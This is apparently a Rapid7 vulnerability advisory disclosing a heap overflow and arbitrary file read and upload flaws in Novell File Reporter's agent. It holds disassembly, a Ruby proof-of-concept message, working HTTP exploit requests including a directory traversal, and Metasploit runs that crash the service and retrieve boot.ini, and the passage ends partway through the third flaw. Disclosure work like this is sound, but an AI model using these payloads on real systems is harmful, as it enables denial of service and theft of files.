                                    <li><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/&amp;title=New+0day+Exploits%3a+Novell+File+Reporter+Vulnerabilities&amp;summary=Today%2c+we+present+to+you+several+new+vulnerabilities+discovered+in+Novell+File+Reporter+1.0.2%2c+which+%22helps+organizations+more+effectively+manage+network+storage+by+providing+administrators+the+ability+to+access+comprehensive+network+storage+information+so+that+they+can+determine+the+best+means+of+addressing+their+storage+content%22.+Following+our+standard+disclosure+policy+%5bhttp%3a%2f%2fwww.rapid7.com%2fdisclosure.jsp%5d%2c+we+notified+both+Novell+and+CERT.+Vulnerabilities+Summary+The+four+vulnerabilities+p" class="linkedin" onclick="window.open(this.href, 'linkedin-share', 'width=520,height=570');return false;"></a></li>
                                    <li><a href="https://twitter.com/intent/tweet?text=New+0day+Exploits%3a+Novell+File+Reporter+Vulnerabilities&amp;url=https%3a%2f%2fwww.rapid7.com%2fblog%2fpost%2f2012%2f11%2f16%2fnfr-agent-buffer-vulnerabilites-cve-2012-4959%2f" class="twitter" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;"></a></li>
                                    <li><a href="https://www.facebook.com/sharer/sharer.php?u=https://www.rapid7.com/blog/post/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959/" class="facebook" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;"></a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="post-content">
                            <!--kg-card-begin: markdown--><p>Today, we present to you several new vulnerabilities discovered in Novell File Reporter 1.0.2, which &quot;helps organizations more effectively manage network storage by providing administrators the ability to access comprehensive network storage information so that they can determine the best means of addressing their storage content&quot;. Following our standard <a href="http://www.rapid7.com/disclosure.jsp">disclosure policy</a>, we notified both Novell and CERT.</p>
<h2 id="vulnerabilitiessummary">Vulnerabilities Summary</h2>
<p>The four vulnerabilities presented have been found in the same component, NFRAgent.exe, which communicates with the Agent component over HTTPS on TCP port 3037:</p>
<ul>
<li>
<p><a href="https://community.rapid7.com/#CVE-2012-4956">CVE-2012-4956</a> - Heap Overflow: When <span>handling requests of name “SRS”, the NFRAgent.exe fails to generate a response in a secure way, copying user controlled data into a fixed-length buffer in the heap without bounds checking. This vulnerability can result in remote code execution under the context of the SYSTEM account.</span></p>
</li>
<li>
<p><a href="https://community.rapid7.com/#CVE-2012-4957">CVE-2012-4957</a> - Arbitrary File Retrieval: W<span>hen handling requests on “/FSF/CMD” for records with NAME “SRS”, OPERATION “4” and CMD “103” the NFRAgent.exe allows a remote unauthenticated user to retrieve arbitrary remote files, specified with the tag “PATH”, with SYSTEM privileges.</span></p>
</li>
<li>
<p><a href="https://community.rapid7.com/#CVE-2012-4958">CVE-2012-4958</a> - Arbitrary File Retrieval: <span>When handling requests on “/FSF/CMD” for records with NAME “FSFUI” and UICMD “126” the NFRAgent.exe allows a remote unauthenticated user to retrieve arbitrary remote text files, specified with the tag “FILE”, with SYSTEM privileges.</span></p>
</li>
<li>
<p><a href="https://community.rapid7.com/#CVE-2012-4959">CVE-2012-4959</a> - Arbitrary File Upload: <span>When handling requests on “/FSF/CMD” for records with NAME “FSFUI” and UICMD “130” the NFRAgent.exe allows a remote unauthenticated user to upload files to the host, specified with the tag “FILE”, with SYSTEM privileges. It allows to execute remote code with SYSTEM privileges.</span></p>
</li>
</ul>
<h2 id="disclosuretimeline">Disclosure Timeline</h2>
<table>
<thead>
<tr>
<th>Date</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>2012-09-14</td>
<td>Initial discovery by Juan Vazquez</td>
</tr>
<tr>
<td>2012-09-14</td>
<td>Metasploit modules written</td>
</tr>
<tr>
<td>2012-09-17</td>
<td>Initial disclosure to Novell</td>
</tr>
<tr>
<td>2012-11-06</td>
<td>Disclosure to US CERT</td>
</tr>
<tr>
<td>2012-11-16</td>
<td>Public disclosure and Metasploit module published</td>
</tr>
</tbody>
</table>
<h2 id="technicalanalysis">Technical Analysis</h2>
<h3 id="cve20124956heapoverflow"><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4956">CVE-2012-4956</a> - Heap Overflow</h3>
<p><strong>Static analysis</strong></p>
<p><span>The NFSAgent.exe allows communication with the Agent component over HTTPS on port TCP 3037. The requests against the Agent component are XML messages, containing “records” to be processes by the Agent. The Agent handles different types of record, one of them is “SRS”:</span></p>
<pre><code>.text:00404BE9                add    esp, 0Ch
.text:00404BEC                push    14h            ; length_arg_C
.text:00404BEE                lea    eax, [ebp+record_name_var_28]
.text:00404BF1                push    eax            ; result_arg_8
.text:00404BF2                push    offset aName    ; &quot;NAME&quot;
.text:00404BF7                mov    ecx, [ebp+message_arg_8]
.text:00404BFA                add    ecx, 20h
.text:00404BFD                push    ecx            ; xml_message_arg_0
.text:00404BFE                mov    ecx, [ebp+var_2C]
.text:00404C01                call    parse_tag_sub_40A760 ; search tag &quot;NAME&quot; in the xml_message_arg_0 and store contents int he &quot;record_name_var_28&quot; variable
.text:00404C06                movzx  edx, al
.text:00404C09                test    edx, edx
.text:00404C0B                jz      short loc_404C8B
.text:00404C0D                push    offset aSrs_2  ; &quot;SRS&quot;
.text:00404C12                lea    eax, [ebp+record_name_var_28]
.text:00404C15                push    eax            ; char *
.text:00404C16                call    _strcmp        ; compares the contents of the &quot;NAME&quot; element in the xml message from the request with the &quot;SRS&quot; string.
.text:00404C1B                add    esp, 8
.text:00404C1E                test    eax, eax
.text:00404C20                jnz    short loc_404C38 ; if not &quot;SRS&quot; name check others, if yes, handle it...
.text:00404C22                mov    ecx, [ebp+message_arg_8]
.text:00404C25                push    ecx            ; void *
.text:00404C26                mov    edx, [ebp+arg_4]
.text:00404C29                push    edx            ; int
.text:00404C2A                mov    eax, [ebp+arg_0]
.text:00404C2D                push    eax            ; int
.text:00404C2E                call    handle_SRS_sub_4048D0 ; handle the XML message with the RECORD of NAME &quot;SRS&quot;
</code></pre>
<p><span>In the function which handles records of name “SRS”, named “handle_SRS_sub_408D0”, a fixed-length buffer is created in the heap with “malloc()”:</span></p>
<pre><code>.text:00404903                push    0C350h        ; size_t
.text:00404908                call    _malloc
.text:0040490D                add    esp, 4
.text:00404910                mov    [ebp+response_var_8], eax
</code></pre>
<p><span>This buffer is used to store the response which is going to be returned to the user after handling the “SRS” record. An “SRS” record can request different types of operation, by using the tags “OPERATION” and “CMD”. In this report, the “OPERATION” with id 7, and “CMD” 4, has been used. This operation allows a user to specify a set of volumes, and retrieve the free space for everyone. The format of the request XML message is this:</span></p>
<pre><code>&lt;RECORD&gt;  
    &lt;NAME&gt;SRS&lt;/NAME&gt;  
    &lt;OPERATION&gt;4&lt;/OPERATION&gt;  
    &lt;CMD&gt;7&lt;/CMD&gt;  
    &lt;VOL&gt;vol_1_name&lt;/VOL&gt;  
    &lt;VOL&gt;vol_2_name&lt;/VOL&gt;  
&lt;/RECORD&gt; 
</code></pre>
<p><span>While the analysis of the current vulnerability, has been discovered that the response is generated from the user request, copying the contents of the requested “VOL” elements to the fixed-length buffer in the heap without bounds checking.</span></p>
<p><span><strong>Note: maybe other operations requested via “SRS” records can be used to trigger a heap overflow. It has not been checked.</strong></span></p>
<p><span></span></p>
<p><span>The operation is handled by the function named “SRS_7_4_sub_4082E0”, which gets two arguments, the XML message for the RECORD to handle and the pointer to the vulnerable heap buffer allocated to store the response:</span></p>
<pre><code>.text:004082E0 ; int __stdcall SRS_7_4_sub_4082E0(char *xml_message_arg_0, char *result_response_arg_4)
</code></pre>
<p><span>The</span> <span>“VOL” elements (the volume names) are processed by a loop like this in the “SRS_7_4_sub_4082E0” function:</span></p>
<pre><code>for ( vol_object_var_254 = v25; vol_object_var_254; vol_object_var_254 = *(_DWORD *)(vol_object_var_254 + 12) )  
{  
  parse_tag_sub_40A760((void *)v15, *(const char **)vol_object_var_254, (int)&quot;VOL&quot;, &amp;vol_name_var_20c, 0x1F4u); // get VOL element  
  volume_fspace_vol_35C = handle_volume_sub_4081E0(&amp;vol_name_var_20c); // Retrieve Volume Free Space  
  volume_fscape_var_358 = v2;  
  vol_name_html_encode_var_494 = html_encode_sub_40B490(&amp;vol_name_var_20c); // HTML Encode the volume name (user controlled data)  
  if ( vol_name_html_encode_var_494 )  
  { // If the volume name has been HTML Encoded  
  v3 = volume_fscape_var_358;  
  v4 = volume_fspace_vol_35C;  
  v5 = vol_name_html_encode_var_494;  
  v6 = strlen(result_response_arg_4);  
  sprintf(&amp;result_response_arg_4[v6], &quot;&lt;VOL&gt;&lt;NAME&gt;%s&lt;/NAME&gt;&lt;FSPACE&gt;%I64d&lt;/FSPACE&gt;&lt;/VOL&gt;&quot;, v5, v4, v3); // Vulnerability!!! sprintf user controlled data (volume name) to the end of the fix-length buffer in the heap without bound checking  
  free(vol_name_html_encode_var_494);  
  vol_name_html_encode_var_494 = 0;  
  }  
  else  
  { // If the volume name hasn’t been HTML Encoded  
  v7 = volume_fscape_var_358;  
  v8 = volume_fspace_vol_35C;  
  v9 = strlen(result_response_arg_4);  
  sprintf(  
  &amp;result_response_arg_4[v9], // Vulnerability!!! sprintf user controlled data (volume name) to the end of the fix-length buffer in the heap without bound checking  
  &quot;&lt;VOL&gt;&lt;NAME&gt;%s&lt;/NAME&gt;&lt;FSPACE&gt;%I64d&lt;/FSPACE&gt;&lt;/VOL&gt;&quot;,  
  &amp;vol_name_var_20c,  
  v8,  
  v7);  
  }  
}  
</code></pre>
<p><span>In this loop is where the buffer overflow occurs, the results of the VOL handling are attached to the response, stored in the fixed-length allocated buffer in the heap, with a sprintf() call. For every sprintf() the volume name is controlled by the user, specified in the <VOL> elements of the request.</span></p>
<p><span><strong>Proof of Concept and Dynamic Analysis</strong></span></p>
<p>The vulnerability can be triggered by creating a specially crafted message, with a record of name “SRS”, specifying the operation “4” and cmd “7”, including a huge number of volumes (“VOL” elements). The ruby code used to generate the crafted message is this:</p>
<pre><code>data = &quot;4D14AED3B61B0DAB893355B8331CC71A&quot; # Checksum
data &lt;&lt; &quot;&lt;RECORD&gt;&quot;
data &lt;&lt; &quot;&lt;NAME&gt;SRS&lt;/NAME&gt;&lt;OPERATION&gt;4&lt;/OPERATION&gt;&lt;CMD&gt;7&lt;/CMD&gt;&quot; # Operation
data &lt;&lt; &quot;&lt;VOL&gt;AAAAAAAAAA&lt;/VOL&gt;&quot; * 0xc35 # Volumes
data &lt;&lt; &quot;&lt;/RECORD&gt;&quot;
</code></pre>
<p>According to the static analysis presented before, when handling the crafted message, a fixed-length buffer of 0xc350 bytes to store the response is created in the heap:</p>
<pre><code>0:007&gt; g
Breakpoint 0 hit
eax=009e68b8 ebx=003f3bf8 ecx=b85645ca edx=7c90e4f4 esi=003f3bf8 edi=00000000
eip=00404908 esp=0120ff4c ebp=0120ff58 iopl=0        nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000            efl=00000202
NFRAgent+0x4908:
00404908 e84cef0300      call    NFRAgent+0x43859 (00443859)
0:007&gt; dd esp L1
0120ff4c  0000c350
</code></pre>
<p>The allocated buffer is on 0x1220110:</p>
<pre><code>0:007&gt; p
eax=01220110 ebx=003f5e20 ecx=7c9101bb edx=009e0608 esi=003f5e20 edi=00000000
eip=0040490d esp=0120ff4c ebp=0120ff58 iopl=0        nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000            efl=00000202
NFRAgent+0x490d:
0040490d 83c404          add    esp,4
0:007&gt; !heap -p -a eax
    address 01220110 found in
    _HEAP @ 9e0000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        01220108 186b 0000  [01]  01220110    0c350 - (busy)
</code></pre>
<p>The results for every volume are attached to the fixed-length heap buffer via the sprintf at 004085C5:</p>
<pre><code>Breakpoint 1 hit
eax=0122013e ebx=003f5e20 ecx=01220110 edx=c7ff3d52 esi=00479f89 edi=0120f1a1
eip=004085c5 esp=0120eec8 ebp=0120f3c0 iopl=0        nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000            efl=00000202
NFRAgent+0x85c5:
004085c5 e84ea70300      call    NFRAgent+0x42d18 (00442d18)
</code></pre>
<p>The result of the sprintf is going to be stored at 0122013e:</p>
<pre><code>0:007&gt; dd esp L1
0120eec8  0122013e
</code></pre>
<p>The address belongs to the heap buffer:</p>
<pre><code>0:007&gt; !heap -p -a 0122013e
    address 0122013e found in
    _HEAP @ 9e0000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        01220108 186b 0000  [01]  01220110    0c350 - (busy)
</code></pre>
<p>The string which is going to be sprintfed contains the volume name (user controlled data):</p>
<pre><code>0:007&gt; da poi(esp+4)
0047a040  &quot;&lt;VOL&gt;&lt;NAME&gt;%s&lt;/NAME&gt;&lt;FSPACE&gt;%I64&quot;
0047a060  &quot;d&lt;/FSPACE&gt;&lt;/VOL&gt;&quot;
0:007&gt; da poi(esp+8)
01250208  &quot;AAAAAAAAAA&quot;
</code></pre>
<p>After the first sprint, the contents of the heap vulnerable buffer are:</p>
<pre><code>0:007&gt; da 01220110
01220110  &quot;&lt;RESULT&gt;&lt;VERSION&gt;1&lt;/VERSION&gt;&lt;STA&quot;
01220130  &quot;TUS&gt;0&lt;/STATUS&gt;&lt;VOL&gt;&lt;NAME&gt;AAAAAAA&quot;
01220150  &quot;AAA&lt;/NAME&gt;&lt;FSPACE&gt;0&lt;/FSPACE&gt;&lt;/VO&quot;
01220170  &quot;L&gt;&quot;
</code></pre>
<p>At this point, the contents of the heap, just after the vulnerable buffer, are presented:</p>
<pre><code>0:007&gt; !heap -p -a 01220110+0c350
    address 0122c460 found in
    _HEAP @ 9e0000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        0122c460 0003 0000  [01]  0122c468    00010 - (busy)
0:007&gt; db 0122c460 L8
0122c460  03 00 6b 18 19 01 08 01 
0:007&gt; db 0122c468 L10
0122c468  80 c4 22 01 16 00 00 00-d0 9f 9e 00 a0 c4 22 01  ..&quot;...........&quot;.
</code></pre>
<p>After the offending loop the contents after the vulnerable heap buffer have been overwritten. For the chunk just after our vulnerable buffer, both heap chunk metadata and contents have been overflowed:</p>
<pre><code>0:007&gt; g
Breakpoint 0 hit
eax=00000000 ebx=003f5e20 ecx=00443085 edx=012501b0 esi=00479f89 edi=0120f1a1
eip=00408645 esp=0120eedc ebp=0120f3c0 iopl=0        nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000            efl=00000246
NFRAgent+0x8645:
00408645 c7852cfbffff00000000 mov dword ptr [ebp-4D4h],0 ss:0023:0120eeec=03ee2001
0:007&gt; !heap -p -a 01220110
    address 01220110 found in
    _HEAP @ 9e0000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        01220108 186b 0000  [01]  01220110    0c350 - (busy)
0:007&gt; !heap -p -a 01220110+0xc350
    address 0122c460 found in
    _HEAP @ 9e0000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        0122c460 3e45 0000  [46]  0122c468    1f220 - (free)
0:007&gt; db 0122c460 L8
0122c460  45 3e 30 3c 2f 46 53 50                          E&gt;0&lt;/FSP
0:007&gt; db 0122c468 L10
0122c468  41 43 45 3e 3c 2f 56 4f-4c 3e 3c 56 4f 4c 3e 3c  ACE&gt;&lt;/VOL&gt;&lt;VOL&gt;&lt;
</code></pre>
<p>And finally, with the proof of concept, the NFRAgent.exe crashes because tries to dereference a overwritten pointer:</p>
<pre><code>0:007&gt; g
(9ac.2f4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000016 ebx=003f5e20 ecx=00443085 edx=3c3e4c4f esi=00479f89 edi=0120f1a1
eip=00405a70 esp=0120eec8 ebp=0120eed0 iopl=0        nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000            efl=00010202
NFRAgent+0x5a70:
00405a70 833a00          cmp    dword ptr [edx],0    ds:0023:3c3e4c4f=????????
</code></pre>
<p><span>In order to assist testing of the vulnerability a metasploit module has been developed:</span></p>
<pre><code>
msf &gt; use auxiliary/dos/http/novell_file_reporter_heap_bof 
msf  auxiliary(novell_file_reporter_heap_bof) &gt; set RHOST 192.168.1.150
RHOST =&gt; 192.168.1.150
msf  auxiliary(novell_file_reporter_heap_bof) &gt; show options

Module options (auxiliary/dos/http/novell_file_reporter_heap_bof):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        Use a proxy chain
   RHOST    192.168.1.150    yes       The target address
   RPORT    3037             yes       The target port
   SSL      true             yes       Use SSL
   VHOST                     no        HTTP server virtual host
msf  auxiliary(novell_file_reporter_heap_bof) &gt; run

[*] 192.168.1.150:3037 - Triggering the Heap Overflow to cause DoS...
[+] 192.168.1.150:3037 - NFR Agent didn't answer, DoS was successful
[*] Auxiliary module execution completed
msf  auxiliary(novell_file_reporter_heap_bof) &gt; 
</code></pre>
<h3 id="cve20124957arbitraryfileretrieval"><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4957">CVE-2012-4957</a> - Arbitrary File Retrieval</h3>
<p>The NFSAgent.exe allows communication with the Agent component over HTTPS on port TCP 3037. The requests against the Agent component are XML messages, containing “records” to be processes by the Agent.  The vulnerability occurs when the NFRAgent.exe handles requests on the URL “/FSF/CMD”.  When handling RECORDs with NAME “SRS”, OPERATION “4” and CMD “103” the following code manages the requests:</p>
<pre><code>.text:00408ACA       
.text:00408ACA                push    104h          ; jumptable 0040878F case 99
.text:00408ACF                lea    eax, [ebp+file_path_var_110]
.text:00408AD5                push    eax            ; result_arg_8
.text:00408AD6                push    offset aPath_1 ; &quot;PATH&quot;
.text:00408ADB                mov    ecx, [ebp+xml_message_arg_8]
.text:00408ADE                push    ecx            ; xml_message_arg_0
.text:00408ADF                mov    ecx, [ebp+var_9D4]
.text:00408AE5                call    parse_tag_sub_40A760 ; retrieve the contents of the PATH element
.text:00408AEA                movzx  edx, al
.text:00408AED                test    edx, edx
.text:00408AEF                jz      short loc_408B52
.text:00408AF1                mov    eax, [ebp+arg_0]
.text:00408AF4                push    eax
.text:00408AF5                mov    ecx, [ebp+arg_4]
.text:00408AF8                push    ecx
.text:00408AF9                push    0
.text:00408AFB                push    0
.text:00408AFD                push    offset aApplicationOct ; &quot;application/octet-stream&quot;
.text:00408B02                lea    edx, [ebp+file_path_var_110]
.text:00408B08                push    edx
.text:00408B09                call    SNISendDocResponse ; retrieve file contents and send back response
.text:00408B0E                add    esp, 18h
.text:00408B11                mov    [ebp+result_operation_var_9C1], al
.text:00408B17                movzx  eax, [ebp+result_operation_var_9C1]
.text:00408B1E                test    eax, eax
.text:00408B20                jz      short error_loc_408B3A
.text:00408B22                lea    ecx, [ebp+file_path_var_110]
.text:00408B28                push    ecx
.text:00408B29                push    offset aAddtaskSuccess ; &quot;AddTask: Successfully started send of f&quot;...
.text:00408B2E                push    0
.text:00408B30                call    write_log_sub_406080
.text:00408B35                add    esp, 0Ch
.text:00408B38                jmp    short loc_408B50
.text:00408B3A ; ---------------------------------------------------------------------------
.text:00408B3A
.text:00408B3A error_loc_408B3A:                      ; CODE XREF: parse_cmd_sub_4086B0+470j
.text:00408B3A                lea    edx, [ebp+file_path_var_110]
.text:00408B40                push    edx
.text:00408B41                push    offset aAddtaskFailedT ; &quot;AddTask: Failed to send file (%s).&quot;
.text:00408B46                push    0
.text:00408B48                call    write_log_sub_406080
.text:00408B4D                add    esp, 0Ch
</code></pre>
<p>In the code presented above the file path is retrieved from the PATH element of the XML request. The filename is used to call the function SNISendDocResponse() provided by the ccs.dll component, which uses the provided filename to call directly “fopen” and read the contents.</p>
<p><strong>Exploitation</strong></p>
<p>In order to exploit the vulnerability the user must build a XML message like this one:</p>
<pre><code>&lt;RECORD&gt;  
    &lt;NAME&gt;SRS&lt;/NAME&gt;  
    &lt;OPERATION&gt;4&lt;/OPERATION&gt;  
    &lt;CMD&gt;103&lt;/CMD&gt;  
    &lt;PATH&gt;c:\\boot.ini&lt;/PATH&gt;  
&lt;/RECORD&gt;  
</code></pre>
<p>The file to read must be specified in the <PATH> element. The message must be sent through HTTPS to the PATH “/FSF/CMD”.</p>
<p>The HTTP body must include a concatenation of a MD5 checksum of the xml message and the xml message. In order to generate a correct MD5 checksum of the xml message, it must be generated from a string with the next format: <strong>“SRS” XML MESSAGE “SERVER”</strong>, where “SRS” and “SERVER” are static strings.</p>
<p>As example the next HTTP request allows to retrieve the contents of the “C:\boot.ini” file:</p>
<pre><code>POST /FSF/CMD HTTP/1.1
Host: 192.168.1.137:2037
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Type: text/xml
Content-Length: 127
 
 
FD97A41459FD495A43E3BF922B40DB23&lt;RECORD&gt;&lt;NAME&gt;SRS&lt;/NAME&gt;&lt;OPERATION&gt;4&lt;/OPERATION&gt; &lt;CMD&gt;103&lt;/CMD&gt;&lt;PATH&gt;c:\boot.ini&lt;/PATH&gt;&lt;/RECORD&gt;
</code></pre>
<p>The contents of the “c:\boot.ini” are returned back to the user:</p>
<pre><code>HTTP/1.1 200 OK
MIME-version: 1.0
Connection: close
Content-Type: application/octet-stream
Content-Length: 211
 
 
[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
[operating systems]
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetect
</code></pre>
<p>In order to assist testing of the vulnerability a metasploit module has been developed:</p>
<pre><code>
msf &gt; use auxiliary/scanner/http/novell_file_reporter_srs_fileaccess 
msf  auxiliary(novell_file_reporter_srs_fileaccess) &gt; set RHOSTS 192.168.1.150
RHOSTS =&gt; 192.168.1.150
msf  auxiliary(novell_file_reporter_srs_fileaccess) &gt; show options

Module options (auxiliary/scanner/http/novell_file_reporter_srs_fileaccess):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        Use a proxy chain
   RFILE    c:\boot.ini      yes       Remote File
   RHOSTS   192.168.1.150    yes       The target address range or CIDR identifier
   RPORT    3037             yes       The target port
   SSL      true             yes       Use SSL
   THREADS  1                yes       The number of concurrent threads
   VHOST                     no        HTTP server virtual host

msf  auxiliary(novell_file_reporter_srs_fileaccess) &gt; run

[*] 192.168.1.150:3037 - Retrieving the file contents
[*] 192.168.1.150:3037 - c:\boot.ini saved in /Users/juan/.msf4/loot/20121109155445_default_192.168.1.150_novell.filerepor_923267.ini
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf  auxiliary(novell_file_reporter_srs_fileaccess) &gt; cat /Users/juan/.msf4/loot/20121109155445_default_192.168.1.150_novell.filerepor_923267.ini[*] exec: cat /Users/juan/.msf4/loot/20121109155445_default_192.168.1.150_novell.filerepor_923267.ini

[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
[operating systems]
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetect
 
</code></pre>
<h3 id="cve20124958arbitraryfileretrieval"><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4958">CVE-2012-4958</a> - Arbitrary File Retrieval</h3>
<p>The NFSAgent.exe allows communication with the Agent component over HTTPS on port TCP 3037. The requests against the Agent component are XML messages, containing “records” to be processes by the Agent.  The vulnerability occurs when the NFRAgent.exe handles requests on the URL “/FSF/CMD”.  When handling RECORDs with NAME “FSFUI” and UICMD “126” the request is managed by the function named as read_file_sub_409FA0() whose decompiled pseudocode is presented below:</p>
<pre><code>char *__stdcall read_file_sub_409FA0(char *xml_message_arg_0, char *a2)  
{  
  size_t v2; // eax@1  
  size_t v3; // eax@3  
  FILE *v4; // ST0C_4@5  
  size_t v5; // eax@5  
  size_t v6; // eax@5  
  char *result; // eax@5  
  char result_arg_8[260]; // [sp+Ch] [bp-190h]@1  
  int v9; // [sp+110h] [bp-8Ch]@1  
  size_t v10; // [sp+114h] [bp-88h]@5  
  FILE *v11; // [sp+118h] [bp-84h]@2  
  char v12; // [sp+11Ch] [bp-80h]@1  
  char v13; // [sp+154h] [bp-48h]@1  
  char v14; // [sp+158h] [bp-44h]@1  
  __int16 v15; // [sp+194h] [bp-8h]@1  
  char v16; // [sp+196h] [bp-6h]@1  
  
  
  memcpy(&amp;v14, &quot;&lt;RESULT&gt;&lt;VERSION&gt;1&lt;/VERSION&gt;&lt;STATUS&gt;0&lt;/STATUS&gt;&lt;CFILE&gt;&lt;![CDATA[&quot;, 0x3Cu);  
  v15 = *(_WORD *)&quot;A[&quot;;  
  v16 = aResultVersi_19[62];  
  memcpy(&amp;v12, &quot;&lt;RESULT&gt;&lt;VERSION&gt;1&lt;/VERSION&gt;&lt;STATUS&gt;14&lt;/STATUS&gt;&lt;/RESULT&gt;&quot;, 0x38u);  
  v13 = aResultVersi_20[56];  
  v9 = sub_40B670();  
  sub_402200(result_arg_8);  
  strcat(result_arg_8, &quot;\\&quot;);  
  v2 = strlen(result_arg_8);  
  // The file path is retrieved from the FILE element of the XML request.  
  if ( (unsigned __int8)parse_tag_sub_40A760(xml_message_arg_0, (int)&quot;FILE&quot;, &amp;result_arg_8[v2], 256) )  
  {  
    // The FILE element can specify an absolute PATH  
    v11 = fopen(result_arg_8, &quot;rb&quot;);  
    if ( !v11 )  
    {  
      strcpy(result_arg_8, Buffer);  
      strcat(result_arg_8, &quot;\\&quot;);  
      v3 = strlen(result_arg_8);  
      //Or use a directory traversal to access with a relative PATH  
      parse_tag_sub_40A760(xml_message_arg_0, (int)&quot;FILE&quot;, &amp;result_arg_8[v3], 256);  
      v11 = fopen(result_arg_8, &quot;rb&quot;);  
    }  
    if ( v11 )  
    {  
      strcpy(a2, &amp;v14);  
      v4 = v11;  
      v5 = strlen(&amp;v14);  
      // The contents of the specified file are read and attached to the response (a2)  
      v10 = fread(&amp;a2[v5], 1u, 0xAFC8u, v4);  
      fclose(v11);  
      v6 = strlen(&amp;v14);  
      result = strcpy(&amp;a2[v10] + v6, &quot;]]&gt;&lt;/CFILE&gt;&lt;/RESULT&gt;&quot;);  
    }  
    else  
    {  
      result = strcpy(a2, &amp;v12);  
    }  
  }  
  else  
  {  
    result = strcpy(a2, &amp;v12);  
  }  
  return result;  
}  
</code></pre>
<p>In the code presented above the file path is retrieved from the FILE element of the XML request. The filename is used to call the function fopen() and then fread() is used to read the file contents. Finally the contents are attached to the response contents which will be returned back to the user.</p>
<p><strong>Exploitation</strong></p>
<p>In order to exploit the vulnerability the user must build a XML message like this one:</p>
<pre><code>&lt;RECORD&gt;  
    &lt;NAME&gt;FSFUI&lt;/NAME&gt;  
    &lt;UICMD&gt;126&lt;/UICMD&gt;  
    &lt;FILE&gt;..\..\..\..\..\..\boot.ini&lt;/FILE&gt;  
&lt;/RECORD&gt;  
</code></pre>
<p>The file to read must be specified in the <FILE> element. The message must be sent through HTTPS to the PATH “/FSF/CMD”.</p>
<p>The HTTP body must include a concatenation of a MD5 checksum of the xml message and the xml message. In order to generate a correct MD5 checksum of the xml message, it must be generated from a string with the next format: <strong>“SRS” XML MESSAGE “SERVER”</strong>, where “SRS” and “SERVER” are static strings.</p>
<p>As example the next HTTP request allows to retrieve the contents of the “C:\boot.ini” file:</p>
<pre><code>POST /FSF/CMD HTTP/1.1
Host: 192.168.1.137:2037
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Type: text/xml
Content-Length: 124
 
 
562A72C2A891EC182BD76414BBB04C88&lt;RECORD&gt;&lt;NAME&gt;FSFUI&lt;/NAME&gt;&lt;UICMD&gt;126&lt;/UICMD&gt;&lt;FIL E&gt;..\..\..\..\..\..\boot.ini&lt;/FILE&gt;&lt;/RECORD&gt;
</code></pre>
<p>The contents of the “c:\boot.ini” are returned back to the user:</p>
<pre><code>HTTP/1.1 200 OK
MIME-version: 1.0
Connection: close
Content-Type: text/xml
Content-Length: 293
 
 
&lt;RESULT&gt;&lt;VERSION&gt;1&lt;/VERSION&gt;&lt;STATUS&gt;0&lt;/STATUS&gt;&lt;CFILE&gt;&lt;![CDATA[[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
[operating systems]
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetect
]]&gt;&lt;/CFILE&gt;&lt;/RESULT&gt;
</code></pre>
<p>In order to assist testing of the vulnerability a metasploit module has been developed:</p>
<pre><code> 
msf &gt; use auxiliary/scanner/http/novell_file_reporter_fsfui_fileaccess 
msf  auxiliary(novell_file_reporter_fsfui_fileaccess) &gt; set RHOSTS 192.168.1.150
RHOSTS =&gt; 192.168.1.150
msf  auxiliary(novell_file_reporter_fsfui_fileaccess) &gt; show options

Module options (auxiliary/scanner/http/novell_file_reporter_fsfui_fileaccess):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   DEPTH    6                yes       Traversal depth
   Proxies                   no        Use a proxy chain
   RFILE    boot.ini         yes       Remote File
   RHOSTS   192.168.1.150    yes       The target address range or CIDR identifier
   RPORT    3037             yes       The target port
   SSL      true             yes       Use SSL
   THREADS  1                yes       The number of concurrent threads
   VHOST                     no        HTTP server virtual host

msf  auxiliary(novell_file_reporter_fsfui_fileaccess) &gt; run

[*] 192.168.1.150:3037 - Retrieving the file contents
[*] 192.168.1.150:3037 - boot.ini saved in /Users/juan/.msf4/loot/20121109154657_default_192.168.1.150_novell.filerepor_624595.ini
[*] Scanned 1 of 1 hosts (100% complete)
